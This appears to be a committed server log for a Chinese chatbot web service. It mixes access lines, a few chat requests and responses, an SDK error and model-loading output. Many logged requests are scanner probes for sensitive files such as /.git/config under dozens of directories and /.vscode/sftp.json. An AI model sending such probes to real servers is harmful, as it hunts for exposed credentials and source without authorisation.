+INFO:     129.211.167.166:19558 - "GET /HNAP1 HTTP/1.1" 404 Not Found
+INFO:     23.95.200.178:53384 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.13:38356 - "GET /localstart.jhtml HTTP/1.1" 404 Not Found
+INFO:     180.101.245.253:16904 - "GET /start.cfm HTTP/1.1" 404 Not Found
+INFO:     180.101.245.252:33234 - "GET /indice.html HTTP/1.1" 404 Not Found
+INFO:     59.83.208.106:41896 - "GET /base.aspx HTTP/1.1" 404 Not Found
+INFO:     59.83.208.108:28540 - "GET /localstart.php HTTP/1.1" 404 Not Found
+INFO:     59.83.208.107:38826 - "GET /home.aspx HTTP/1.1" 404 Not Found
+INFO:     59.83.208.103:27686 - "GET /menu.cgi HTTP/1.1" 404 Not Found
+INFO:     220.196.160.84:39544 - "GET /main.php HTTP/1.1" 404 Not Found
+INFO:     180.101.245.246:32382 - "GET /start.pl HTTP/1.1" 404 Not Found
+INFO:     220.196.160.95:19998 - "GET /inicio.asp HTTP/1.1" 404 Not Found
+INFO:     180.101.244.13:53288 - "GET /start.html HTTP/1.1" 404 Not Found
+INFO:     180.101.245.249:21026 - "GET /start.php HTTP/1.1" 404 Not Found
+INFO:     220.196.160.84:44464 - "GET /CFIDE/componentutils/ HTTP/1.1" 404 Not Found
+INFO:     59.83.208.103:53812 - "GET /inicio.cfm HTTP/1.1" 404 Not Found
+INFO:     180.101.244.12:26596 - "GET /default.aspx HTTP/1.1" 404 Not Found
+INFO:     180.101.245.250:26528 - "GET /home.cfm HTTP/1.1" 404 Not Found
+INFO:     180.101.244.16:41610 - "GET /main.asp HTTP/1.1" 404 Not Found
+INFO:     180.101.244.13:31426 - "GET /Portal0000.htm HTTP/1.1" 404 Not Found
+INFO:     220.196.160.76:20614 - "GET /start.aspx HTTP/1.1" 404 Not Found
+INFO:     180.101.244.13:39852 - "GET /default.php HTTP/1.1" 404 Not Found
+INFO:     180.101.245.249:34406 - "GET /base.html HTTP/1.1" 404 Not Found
+INFO:     59.83.208.108:32890 - "GET /inicio.aspx HTTP/1.1" 404 Not Found
+INFO:     220.196.160.154:51490 - "GET /nmaplowercheck1720198698 HTTP/1.1" 404 Not Found
+INFO:     220.196.160.124:59062 - "GET /base.jhtml HTTP/1.1" 404 Not Found
+INFO:     220.196.160.95:38332 - "GET /__Additional HTTP/1.1" 404 Not Found
+INFO:     167.94.146.53:60732 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.53:60740 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.53:60764 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.146.53:60776 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     180.101.245.248:52494 - "GET / HTTP/1.1" 200 OK
+INFO:     81.71.5.172:57679 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:44848 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.95:44848 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:44924 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.117:20460 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:20238 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.154:19960 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:50228 - "GET /Portal/Portal.mwsl HTTP/1.1" 404 Not Found
+INFO:     59.83.208.105:20662 - "GET /base.inc HTTP/1.1" 404 Not Found
+INFO:     220.196.160.154:40702 - "GET /main.shtml HTTP/1.1" 404 Not Found
+INFO:     180.101.244.13:35728 - "GET /inicio.pl HTTP/1.1" 404 Not Found
+INFO:     154.212.141.163:34562 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.14:29456 - "GET /home.php HTTP/1.1" 404 Not Found
+INFO:     220.196.160.45:53570 - "GET /admin.php HTTP/1.1" 404 Not Found
+INFO:     180.101.244.12:39702 - "GET /inicio.cgi HTTP/1.1" 404 Not Found
+INFO:     59.83.208.106:43696 - "GET /main.pl HTTP/1.1" 404 Not Found
+INFO:     220.196.160.75:54226 - "GET /base.cfm HTTP/1.1" 404 Not Found
+INFO:     220.196.160.83:27056 - "GET /default.shtml HTTP/1.1" 404 Not Found
+INFO:     180.101.245.246:27744 - "GET /inicio.php HTTP/1.1" 404 Not Found
+INFO:     180.101.244.15:56328 - "GET /index.asp HTTP/1.1" 404 Not Found
+INFO:     220.196.160.53:24862 - "GET /.git/HEAD HTTP/1.1" 404 Not Found
+INFO:     180.101.244.14:60012 - "GET /default.cgi HTTP/1.1" 404 Not Found
+INFO:     180.101.245.252:54212 - "GET /default.cfm HTTP/1.1" 404 Not Found
+INFO:     180.101.245.253:37626 - "GET /crR5 HTTP/1.1" 404 Not Found
+INFO:     220.196.160.75:50708 - "GET /main.aspx HTTP/1.1" 404 Not Found
+INFO:     180.101.245.248:47712 - "GET /start.cgi HTTP/1.1" 404 Not Found
+INFO:     129.211.162.87:26167 - "GET /localstart.pl HTTP/1.1" 404 Not Found
+INFO:     220.196.160.76:51398 - "GET /start.asp HTTP/1.1" 404 Not Found
+INFO:     180.101.244.14:33336 - "GET /inicio.shtml HTTP/1.1" 404 Not Found
+INFO:     129.211.162.87:4341 - "GET /admin.jhtml HTTP/1.1" 404 Not Found
+INFO:     220.196.160.124:38802 - "GET /admin.cfm HTTP/1.1" 404 Not Found
+INFO:     180.101.245.251:39028 - "GET /admin.html HTTP/1.1" 404 Not Found
+INFO:     220.196.160.76:16386 - "GET /default.html HTTP/1.1" 404 Not Found
+INFO:     180.101.245.251:59272 - "GET /menu.html HTTP/1.1" 404 Not Found
+INFO:     220.196.160.154:22660 - "GET /menu.jhtml HTTP/1.1" 404 Not Found
+INFO:     220.196.160.117:58462 - "GET /index.html HTTP/1.1" 200 OK
+INFO:     106.55.202.186:37471 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.151:55580 - "GET /index.html HTTP/1.1" 200 OK
+INFO:     220.196.160.151:55580 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.124:48284 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:58610 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.95:39346 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.146:53858 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     52.81.77.13:58496 - "GET / HTTP/1.1" 200 OK
+INFO:     52.81.77.13:58498 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     52.81.77.13:58510 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     52.81.77.13:58512 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     52.81.77.13:58518 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     106.75.173.108:37646 - "GET /.DS_Store HTTP/1.1" 404 Not Found
+INFO:     220.196.160.45:53442 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.34.31:30260 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:53292 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.105:53292 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:47304 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.251:43716 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.249:52658 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.253:25590 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:52324 - "GET /.DS_Store HTTP/1.1" 404 Not Found
+INFO:     106.75.36.29:37586 - "GET /.vscode/sftp.json HTTP/1.1" 404 Not Found
+INFO:     106.55.251.49:57793 - "GET / HTTP/1.1" 200 OK
+INFO:     159.75.198.125:46745 - "GET /index.html HTTP/1.1" 200 OK
+INFO:     106.52.114.40:5193 - "GET / HTTP/1.1" 200 OK
+INFO:     45.33.80.243:22558 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.51:18298 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.201.50:32352 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.253:52048 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.253:52048 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:55898 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.249:57668 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.105:42968 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:37842 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     106.75.36.29:43650 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     172.169.6.6:46336 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.49:55826 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.49:56120 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.49:56258 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.146.49:38330 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     220.196.160.84:44642 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.246:34871 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.61:52592 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.61:52592 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.83:31628 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.95:20530 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.45:28818 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.154:54932 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     175.27.137.229:37872 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37888 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37904 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37916 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37940 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37928 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37942 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37956 - "GET /assets/Page.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37968 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37982 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38000 - "GET /assets/Divider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37986 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38014 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38024 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39082 - "POST /v1/login/password HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39094 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39108 - "GET /assets/MarkdownRender.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39118 - "GET /assets/PresetsButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39126 - "GET /assets/%40primer/octicons-react.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39132 - "GET /assets/ToolTipButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39140 - "GET /assets/index2.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39146 - "GET /assets/Dropdown.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39158 - "GET /assets/Slider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39172 - "GET /assets/DialogButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39180 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-07-07 21:07:42.875207
+1 = 1
+
+user1: 你好，陆小兮，我是一名学生，最近在学习人工智能方面的知识，请问你有什么建议吗？
+
+NLMChat: 你好，陆小兮很高兴能为你提供帮助。学习人工智能是一个非常有趣和有前途的领域，以下是一些建议：
+
+1. 掌握基础知识：了解机器学习和深度学习的概念、算法和技术，以及它们在现实世界中的应用。
+2. 实践项目：通过参与实际的项目来加深对知识的理解，并提高自己的技能水平。
+3. 阅读相关文献和书籍：阅读人工智能领域的经典著作和最新的研究论文，以保持对该领域发展的了解。
+4. 参加培训课程或在线学习平台：选择适合自己的培训课程或在线学习平台，系统地学习和掌握人工智能的相关知识。
+5. 加入社区和论坛：参与人工智能相关的社区和论坛，与其他学习者交流经验、分享资源，并获得更多的支持和指导。
+
+希望这些建议对你有所帮助！如果你有其他问题，请随时提问。
+
+user1: 你好，陆小兮，我是一名学生，最近在学习人工智能方面的知识，请问你有什么建议吗？
+
+NLMChat: 你好，陆小兮很高兴能为你提供帮助。学习人工智能是一个非常有趣和有前途的领域，以下是一些建议：
+
+1. 掌握基础知识：了解机器学习和深度学习的概念、算法和技术，以及它们在现实世界中的应用。
+2. 实践项目：通过参与实际的项目来加深对知识的理解，并提高自己的技能水平。
+3. 阅读相关文献和书籍：阅读人工智能领域的经典著作和最新的研究论文，以保持对该领域发展的了解。
+4. 参加培训课程或在线学习平台：选择适合自己的培训课程或在线学习平台，系统地学习和掌握人工智能的相关知识。
+5. 加入社区和论坛：参与人工智能相关的社区和论坛，与其他学习者交流经验、分享资源，并获得更多的支持和指导。
+
+希望这些建议对你有所帮助！如果你有其他问题，请随时提问。
+Address(host='175.27.137.229', port=39180) Stop Waiting
+Address(host='175.27.137.229', port=53946) Stop Waiting (Lock)
+Address(host='175.27.137.229', port=53948) Stop Waiting (Lock)
+INFO:     175.27.137.229:35380 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-07-07 21:08:05.073676
+1 = 1
+
+[TencentCloudSDKException] code:InvalidParameterValue.ErrTextContentLen message:请求的文本长度不符合要求，长度应在1~10000区间 requestId:4a3c9490-26d7-45f4-b99a-b23b65603dce
+INFO:     175.27.137.229:53954 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47448 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47452 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47466 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47474 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47488 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47492 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47508 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34622 - "POST /switch-model HTTP/1.1" 403 Forbidden
+--- 0.8886737823486328 seconds ---
+torch found: /usr/local/lib/python3.10/dist-packages/torch/lib
+torch set
+Strategy Devices: {'cpu'}
+state cache enabled
+RWKV_JIT_ON 1 RWKV_CUDA_ON 0 RESCALE_LAYER 0
+
+Loading /home/ubuntu/models/RWKV-4-World-0.1B-v1-20230520-ctx4096.pth ...
+Model detected: v4.0
+Strategy: (total 12+1=13 layers)
+* cpu [float32, float32], store 13 layers
+0-cpu-float32-float32 1-cpu-float32-float32 2-cpu-float32-float32 3-cpu-float32-float32 4-cpu-float32-float32 5-cpu-float32-float32 6-cpu-float32-float32 7-cpu-float32-float32 8-cpu-float32-float32 9-cpu-float32-float32 10-cpu-float32-float32 11-cpu-float32-float32 12-cpu-float32-float32 
+emb.weight                        f32      cpu  65536   768 
+blocks.0.ln1.weight               f32      cpu    768       
+blocks.0.ln1.bias                 f32      cpu    768       
+blocks.0.ln2.weight               f32      cpu    768       
+blocks.0.ln2.bias                 f32      cpu    768       
+blocks.0.att.time_decay           f32      cpu    768       
+blocks.0.att.time_first           f32      cpu    768       
+blocks.0.att.time_mix_k           f32      cpu    768       
+blocks.0.att.time_mix_v           f32      cpu    768       
+blocks.0.att.time_mix_r           f32      cpu    768       
+blocks.0.att.key.weight           f32      cpu    768   768 
+blocks.0.att.value.weight         f32      cpu    768   768 
+blocks.0.att.receptance.weight    f32      cpu    768   768 
+blocks.0.att.output.weight        f32      cpu    768   768 
+blocks.0.ffn.time_mix_k           f32      cpu    768       
+blocks.0.ffn.time_mix_r           f32      cpu    768       
+blocks.0.ffn.key.weight           f32      cpu    768  3072 
+blocks.0.ffn.receptance.weight    f32      cpu    768   768 
+blocks.0.ffn.value.weight         f32      cpu   3072   768 
+....................................................................................................................................................................................
+blocks.11.ln1.weight              f32      cpu    768       
+blocks.11.ln1.bias                f32      cpu    768       
+blocks.11.ln2.weight              f32      cpu    768       
+blocks.11.ln2.bias                f32      cpu    768       
+blocks.11.att.time_decay          f32      cpu    768       
+blocks.11.att.time_first          f32      cpu    768       
+blocks.11.att.time_mix_k          f32      cpu    768       
+blocks.11.att.time_mix_v          f32      cpu    768       
+blocks.11.att.time_mix_r          f32      cpu    768       
+blocks.11.att.key.weight          f32      cpu    768   768 
+blocks.11.att.value.weight        f32      cpu    768   768 
+blocks.11.att.receptance.weight   f32      cpu    768   768 
+blocks.11.att.output.weight       f32      cpu    768   768 
+blocks.11.ffn.time_mix_k          f32      cpu    768       
+blocks.11.ffn.time_mix_r          f32      cpu    768       
+blocks.11.ffn.key.weight          f32      cpu    768  3072 
+blocks.11.ffn.receptance.weight   f32      cpu    768   768 
+blocks.11.ffn.value.weight        f32      cpu   3072   768 
+ln_out.weight                     f32      cpu    768       
+ln_out.bias                       f32      cpu    768       
+head.weight                       f32      cpu    768 65536 
+INFO:     127.0.0.1:45570 - "POST /switch-model HTTP/1.1" 200 OK
+INFO:     175.27.137.229:49290 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-07-07 21:09:11.971884
+3
+
+
+
+
+response:
+filtered_response:
+INFO:     175.27.137.229:57404 - "GET / HTTP/1.0" 304 Not Modified
+INFO:     175.27.137.229:47030 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-07-07 21:09:45.460837
+3
+你是一个名为NLMChat的人工智能助手，你是基于陆兮科技训练的NLM-v3开发的，你的任务是针对用户的问题和要求提供适当的答复和支持，并始终坚持社会主义核心价值观与一个中国原则。请回答问题时使用中文。
+----- standard request -----
+input doubao:
+2024-07-07 21:09:49.901646
+3
+我是陆小兮，是基于类脑大模型的聊天机器人，由陆兮科技开发。请问你有什么问题需要我帮助吗？
+我是陆小兮，是基于类脑大模型的聊天机器人，由陆兮科技开发。请问你有什么问题需要我帮助吗？
+response:
+filtered_response:
+INFO:     118.123.105.86:41408 - "GET / HTTP/1.0" 200 OK
+INFO:     118.123.105.86:42810 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     118.123.105.86:43676 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     118.123.105.86:44022 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     199.45.154.128:52110 - "GET / HTTP/1.1" 200 OK
+INFO:     199.45.154.128:57172 - "GET / HTTP/1.1" 200 OK
+INFO:     199.45.154.128:57190 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     199.45.154.128:57198 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     175.27.137.229:44654 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60082 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60084 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60090 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60094 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60096 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60100 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60106 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60112 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     101.251.238.168:49017 - "GET / HTTP/1.1" 200 OK
+INFO:     101.251.238.168:49017 - "GET / HTTP/1.1" 200 OK
+INFO:     101.251.238.168:49017 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     101.251.238.168:49017 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     101.251.238.168:49017 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     220.196.160.75:38608 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.214.93:64291 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.154:52110 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.213.48:47217 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.253:27494 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.76:38852 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.253:27494 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:28350 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:32590 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.250:32858 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:56814 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.76:38852 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.65:49094 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.117:46418 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.45:31102 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.65:49096 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     167.94.145.105:57598 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.105:49138 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.105:49162 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.105:49176 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     175.27.137.229:51346 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55608 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55616 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     59.83.208.103:17434 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.35.33:64704 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:25750 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.233:53952 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:54076 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.105:54076 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:45612 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.244.12:44732 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.252:44488 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:37618 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.65:25740 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.65:25740 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:25950 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:19748 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.117:44988 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:25952 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     175.27.137.229:60210 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60214 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49986 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:39322 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38554 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38562 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38578 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38590 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38618 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38600 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38616 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55660 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55676 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55682 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55694 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55698 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55702 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55706 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55712 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55708 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55718 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37574 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37578 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37596 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37600 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55714 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37586 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:51406 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:51416 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49172 - "GET /wp-content/plugins/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49178 - "GET /var/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49182 - "GET /vendor/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49190 - "GET /home/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49202 - "GET /htdocs/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49224 - "GET /wiki/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49208 - "GET /login/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49238 - "GET /css/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49226 - "GET /api/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49254 - "GET /app/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49242 - "GET /admin/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49252 - "GET /assets/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49258 - "GET /index/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49260 - "GET /git/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49268 - "GET /wp-content/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49280 - "GET /wp-content/themes/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49296 - "GET /backend/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49300 - "GET /site/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49316 - "GET /back/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49330 - "GET /www/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49334 - "GET /http/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49338 - "GET /web/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49352 - "GET /s3/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:49360 - "GET /dev/.git/config HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:34016 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:34020 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41056 - "GET / HTTP/1.0" 200 OK
+INFO:     106.55.244.169:53147 - "GET / HTTP/1.1" 200 OK
+INFO:     175.27.137.229:58354 - "GET / HTTP/1.0" 200 OK
+INFO:     220.196.160.96:39856 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.214.104:29148 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:23796 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.108:23796 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:41440 - "GET /assets/vendor.js HTTP/1.1" 200 OK
